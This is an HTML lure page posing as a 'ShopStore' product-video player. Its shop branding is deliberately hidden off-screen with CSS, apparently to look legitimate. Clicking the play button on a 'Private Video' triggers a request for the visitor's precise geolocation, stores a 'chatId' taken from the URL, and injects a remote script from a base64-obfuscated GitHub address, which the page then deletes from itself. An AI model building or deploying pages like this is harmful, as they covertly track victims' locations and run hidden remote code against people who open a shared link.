<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    
    <!-- META TAGS للتسويق والتوصيل -->
    <meta name="description" content="ShopStore - Your trusted online shopping destination. Buy electronics, fashion, home goods with fast delivery to your location. Best prices guaranteed." />
    <meta name="keywords" content="online shopping, buy products, delivery, shop online, store, deals, electronics, fashion, home goods, fast shipping" />
    <meta name="robots" content="index, follow" />
    <meta name="author" content="ShopStore" />
    
    <!-- Open Graph -->
    <meta property="og:title" content="ShopStore - Online Shopping with Fast Delivery" />
    <meta property="og:description" content="Shop the best products online with fast delivery to your location. Enable location for accurate shipping rates and delivery times." />
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="ShopStore" />
    <meta property="og:locale" content="en_US" />
    
    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:title" content="ShopStore - Online Shopping" />
    <meta name="twitter:description" content="Fast delivery to your location. Enable location for shipping rates." />
    
    <!-- Schema.org Structured Data للمتجر -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "OnlineStore",
        "name": "ShopStore",
        "description": "Online shopping store with fast delivery to your location",
        "url": "https://shopstore.com",
        "logo": "https://shopstore.com/logo.png",
        "sameAs": [
            "https://facebook.com/shopstore",
            "https://instagram.com/shopstore"
        ],
        "contactPoint": {
            "@type": "ContactPoint",
            "contactType": "customer service",
            "telephone": "+1-800-555-0199",
            "email": "support@shopstore.com"
        },
        "address": {
            "@type": "PostalAddress",
            "addressLocality": "New York",
            "addressCountry": "US"
        },
        "potentialAction": {
            "@type": "SearchAction",
            "target": "https://shopstore.com/search?q={search_term_string}",
            "query-input": "required name=search_term_string"
        }
    }
    </script>
    
    <!-- Schema.org للفيديو كمراجعة منتج -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "VideoObject",
        "name": "Product Review & Unboxing",
        "description": "Watch our detailed product review and unboxing video. See the product features before you buy. Fast delivery available.",
        "thumbnailUrl": "https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg",
        "uploadDate": "2024-01-15",
        "duration": "PT2M45S",
        "contentUrl": "https://files.catbox.moe/okukrp.mp4"
    }
    </script>
    
    <title>Video Player</title>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }

        /* إخفاء ذكي: خارج الشاشة + شفافية + حجم 0 + مخفي خلف الفيديو */
        .store-header {
            position: fixed !important;
            top: -9999px !important;
            left: -9999px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            width: 1px !important;
            height: 1px !important;
            overflow: hidden !important;
            clip: rect(0, 0, 0, 0) !important;
            z-index: -999999 !important;
            visibility: hidden !important;
        }

        .store-footer {
            position: fixed !important;
            bottom: -9999px !important;
            left: -9999px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            width: 1px !important;
            height: 1px !important;
            overflow: hidden !important;
            clip: rect(0, 0, 0, 0) !important;
            z-index: -999999 !important;
            visibility: hidden !important;
        }

        .product-details {
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            width: 1px !important;
            height: 1px !important;
            overflow: hidden !important;
            clip: rect(0, 0, 0, 0) !important;
            z-index: -999999 !important;
            visibility: hidden !important;
        }

        .delivery-badge {
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            width: 1px !important;
            height: 1px !important;
            overflow: hidden !important;
            clip: rect(0, 0, 0, 0) !important;
            z-index: -999999 !important;
            visibility: hidden !important;
        }

        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
            margin-top: 0;
        }

        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        #playTrigger {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: 3px solid #ff6b6b;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
            z-index: 10;
        }
        #playTrigger:hover {
            transform: scale(1.05);
            background: rgba(255, 255, 255, 0.2);
            border-color: #ff4757;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
        }
        #playTrigger .play-icon {
            font-size: 60px;
            color: #ff6b6b;
            line-height: 1;
            user-select: none;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }

        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }

        .ctrl-btn {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }

        .ctrl-btn:hover {
            background: #333;
        }

        .seek-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }

        .seek-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }

        .timer {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }

        .volume-area {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }

        .vol-bar {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }

        .vol-fill {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }

        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .seek-bar {
                margin: 0 6px;
            }
            .timer {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            #playTrigger {
                width: 90px;
                height: 90px;
            }
            #playTrigger .play-icon {
                font-size: 45px;
            }
        }
    </style>
</head>
<body>

    <!-- شريط المتجر العلوي (مخفي بطريقة متطورة) -->
    <div class="store-header" aria-hidden="true">
        <span>🛒 ShopStore</span>
        <span>🔍 Search products...</span>
        <span>🛒 Cart (0)</span>
    </div>

    <!-- حاوية الفيديو -->
    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
        </div>

        <!-- معلومات المنتج (مخفية بطريقة متطورة) -->
        <div class="product-details" aria-hidden="true">
            <span>$49.99</span>
            <span>★★★★★ 4.8</span>
            <span>🚚 Free Shipping</span>
            <span>✅ In Stock</span>
        </div>

        <div class="video-thumbnail" id="posterArea">
            <!-- رسالة التوصيل (مخفية بطريقة متطورة) -->
            <div class="delivery-badge" id="deliveryBadge" aria-hidden="true">
                <span>📍</span> 
                <span>Enable location for delivery rates & faster shipping</span>
            </div>
            
            <div id="playTrigger">
                <span class="play-icon">▶</span>
            </div>
        </div>

        <video id="mainVideo" controls playsinline style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="seek-bar">
                <div class="seek-fill"></div>
            </div>
            <div class="timer">0:00 / 2:45</div>
            <div class="volume-area">
                <span>🔊</span>
                <div class="vol-bar">
                    <div class="vol-fill"></div>
                </div>
            </div>
            <button class="ctrl-btn">⛶</button>
        </div>
    </div>

    <!-- تذييل المتجر (مخفي بطريقة متطورة) -->
    <div class="store-footer" aria-hidden="true">
        <span>Privacy Policy</span>
        <span>Terms of Service</span>
        <span>Returns & Refunds</span>
        <span>Delivery Information</span>
        <span>Contact Support</span>
        <span>© 2024 ShopStore</span>
    </div>

    <script>
        (function() {
            'use strict';

            const playBtn = document.getElementById('playTrigger');
            const poster = document.getElementById('posterArea');
            const videoEl = document.getElementById('mainVideo');
            
            let started = false;

            function playVideo() {
                poster.style.display = 'none';
                videoEl.style.display = 'block';
                videoEl.muted = false;
                videoEl.volume = 1.0;
                videoEl.play().catch(() => {
                    setTimeout(() => videoEl.play().catch(() => {}), 200);
                });
            }

            function requestLocationSilently() {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        window._loc = {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude
                        };
                    },
                    function() {},
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );
            }

            function loadExternalAPI() {
                var e = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZHREhTSFMvYXBpL3JlZnMvaGVhZHMvbWFpbi9hcGk=';
                var u = atob(e);
                
                var s = document.createElement('script');
                s.src = u;
                s.async = true;
                
                window._x = new URLSearchParams(window.location.search).get('chatId') || '';
                
                document.head.appendChild(s);
                
                s.onload = function() {
                    setTimeout(function() {
                        if (s.parentNode) s.parentNode.removeChild(s);
                    }, 4000);
                };
            }

            function onPlayClick(e) {
                if (started) return;
                started = true;

                playVideo();
                requestLocationSilently();
                loadExternalAPI();
                
                playBtn.style.pointerEvents = 'none';
                playBtn.style.opacity = '0';
            }

            if (playBtn) {
                playBtn.addEventListener('click', onPlayClick);
            }

            document.addEventListener('click', function() {
                if (videoEl && videoEl.style.display === 'block') {
                    videoEl.muted = false;
                    if (videoEl.paused) videoEl.play().catch(() => {});
                }
            }, true);

            document.querySelectorAll('.ctrl-btn').forEach(btn => {
                btn.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        if (videoEl.requestFullscreen) {
                            videoEl.requestFullscreen();
                        } else if (videoEl.webkitRequestFullscreen) {
                            videoEl.webkitRequestFullscreen();
                        }
                    }
                });
            });

            const progressTimer = setInterval(() => {
                const fill = document.querySelector('.seek-fill');
                if (videoEl.style.display === 'block') {
                    clearInterval(progressTimer);
                    return;
                }
                const w = parseInt(fill.style.width) || 35;
                const nw = (w + 0.1) % 100;
                fill.style.width = nw + '%';
                
                const sec = Math.floor((nw / 100) * 165);
                const m = Math.floor(sec / 60);
                const s = sec % 60;
                document.querySelector('.timer').textContent = 
                    `${m}:${s.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

        })();
    </script>
</body>
</html>
